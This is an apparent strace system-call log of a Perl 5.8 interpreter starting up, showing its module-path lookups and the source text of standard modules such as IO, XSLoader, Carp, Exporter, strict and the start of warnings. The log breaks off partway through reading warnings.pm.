6823  07:15:42.809049 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbf80d170) = -1 ENOENT (No such file or directory)
6823  07:15:42.809064 stat64("/usr/local/lib/perl/5.8.7", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809076 stat64("/usr/local/share/perl/5.8.7", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809088 stat64("/usr/local/lib/perl/5.8.6", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809100 stat64("/usr/local/share/perl/5.8.6", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809111 stat64("/usr/local/lib/perl/5.8.4", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809123 stat64("/usr/local/share/perl/5.8.4", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809134 stat64("/usr/local/lib/perl/5.8.3", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809145 stat64("/usr/local/share/perl/5.8.3", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809157 stat64("/usr/local/lib/perl/5.8.2", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809168 stat64("/usr/local/share/perl/5.8.2", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809180 stat64("/usr/local/lib/perl/5.8.1", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809191 stat64("/usr/local/share/perl/5.8.1", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809203 stat64("/usr/local/lib/perl/5.8.0", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809214 stat64("/usr/local/share/perl/5.8.0", 0xbf80d2b0) = -1 ENOENT (No such file or directory)
6823  07:15:42.809236 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80cfa8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.809249 _llseek(0, 0, [0], SEEK_CUR) = 0
6823  07:15:42.809261 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80cfa8) = -1 EBADF (Bad file descriptor)
6823  07:15:42.809271 _llseek(1, 0, 0xbf80cff0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
6823  07:15:42.809293 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80cfa8) = -1 EINVAL (Invalid argument)
6823  07:15:42.809306 _llseek(2, 0, 0xbf80cff0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6823  07:15:42.809346 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
6823  07:15:42.809390 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80d068) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.809401 _llseek(1, 0, [0], SEEK_CUR) = 0
6823  07:15:42.809412 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
6823  07:15:42.809428 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
6823  07:15:42.809447 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
6823  07:15:42.809512 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
6823  07:15:42.809554 getppid()         = 6821
6823  07:15:42.809612 stat64("/etc/perl/IO.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.809626 stat64("/etc/perl/IO.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.809639 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.809651 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.809665 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.809677 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.809690 stat64("/usr/lib/perl5/IO.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.809702 stat64("/usr/lib/perl5/IO.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.809715 stat64("/usr/share/perl5/IO.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.809727 stat64("/usr/share/perl5/IO.pm", 0xbf80cc6c) = -1 ENOENT (No such file or directory)
6823  07:15:42.809739 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbf80cd5c) = -1 ENOENT (No such file or directory)
6823  07:15:42.809752 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
6823  07:15:42.809772 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
6823  07:15:42.809798 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80ca78) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.809839 _llseek(6, 0, [0], SEEK_CUR) = 0
6823  07:15:42.809880 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
6823  07:15:42.809951 stat64("/etc/perl/XSLoader.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.809977 stat64("/etc/perl/XSLoader.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.809990 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.810003 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.810017 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.810029 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.810043 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.810055 stat64("/usr/lib/perl5/XSLoader.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.810068 stat64("/usr/share/perl5/XSLoader.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.810079 stat64("/usr/share/perl5/XSLoader.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.810093 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.810105 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
6823  07:15:42.810125 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.810138 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.810149 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.810166 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
6823  07:15:42.810476 brk(0x8195000)    = 0x8195000
6823  07:15:42.810775 _llseek(8, 3407, [3407], SEEK_SET) = 0
6823  07:15:42.810832 _llseek(8, 0, [3407], SEEK_CUR) = 0
6823  07:15:42.810843 close(8)          = 0
6823  07:15:42.810905 stat64("/etc/perl/Carp.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.810920 stat64("/etc/perl/Carp.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.810934 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.810950 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.810964 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.810977 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.810991 stat64("/usr/lib/perl5/Carp.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.811002 stat64("/usr/lib/perl5/Carp.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.811015 stat64("/usr/share/perl5/Carp.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.811026 stat64("/usr/share/perl5/Carp.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.811039 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.811051 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.811065 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.811077 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
6823  07:15:42.811098 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.811112 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.811123 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.811140 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
6823  07:15:42.811645 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
6823  07:15:42.811672 read(8, "", 4096) = 0
6823  07:15:42.811683 close(8)          = 0
6823  07:15:42.811705 stat64("/etc/perl/Exporter.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.811719 stat64("/etc/perl/Exporter.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.811732 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.811744 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.811758 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.811771 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.811825 stat64("/usr/lib/perl5/Exporter.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.811838 stat64("/usr/lib/perl5/Exporter.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.811882 stat64("/usr/share/perl5/Exporter.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.811894 stat64("/usr/share/perl5/Exporter.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.811907 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.811919 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.811932 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.811945 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
6823  07:15:42.811966 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.811980 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.811991 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.812008 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
6823  07:15:42.812746 _llseek(8, 2217, [2217], SEEK_SET) = 0
6823  07:15:42.812815 _llseek(8, 0, [2217], SEEK_CUR) = 0
6823  07:15:42.812862 close(8)          = 0
6823  07:15:42.812937 stat64("/etc/perl/strict.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.812953 stat64("/etc/perl/strict.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.812966 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.812979 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.812993 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.813005 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.813019 stat64("/usr/lib/perl5/strict.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.813031 stat64("/usr/lib/perl5/strict.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.813044 stat64("/usr/share/perl5/strict.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.813055 stat64("/usr/share/perl5/strict.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.813068 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.813081 stat64("/usr/lib/perl/5.8/strict.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.813094 stat64("/usr/share/perl/5.8/strict.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.813106 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
6823  07:15:42.813127 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.813141 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.813153 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.813171 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
6823  07:15:42.813371 _llseek(8, 598, [598], SEEK_SET) = 0
6823  07:15:42.813386 _llseek(8, 0, [598], SEEK_CUR) = 0
6823  07:15:42.813396 close(8)          = 0
6823  07:15:42.813434 stat64("/etc/perl/warnings.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.813449 stat64("/etc/perl/warnings.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.813462 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.813475 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.813488 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.813501 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.813515 stat64("/usr/lib/perl5/warnings.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.813526 stat64("/usr/lib/perl5/warnings.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.813539 stat64("/usr/share/perl5/warnings.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.813551 stat64("/usr/share/perl5/warnings.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.813564 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.813577 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.813590 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.813602 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
6823  07:15:42.813623 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.813637 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.813648 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.813666 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    